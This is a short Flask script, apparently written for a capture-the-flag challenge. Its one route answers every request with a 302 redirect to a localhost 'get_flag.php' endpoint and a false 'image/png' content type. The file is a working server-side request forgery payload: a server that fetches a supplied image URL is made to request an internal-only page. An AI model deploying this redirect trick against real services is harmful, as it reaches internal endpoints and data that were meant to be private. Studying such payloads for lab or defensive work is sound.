from flask import Flask, Response

app = Flask(__name__)

@app.route('/')
def redir():
    return Response(
        "",  # Empty body
        headers={
            "Content-Type": "image/png",
            "Location": "http://127.0.0.1/get_flag.php"
        },
        status=302
    )

if __name__ == '__main__':
    app.run()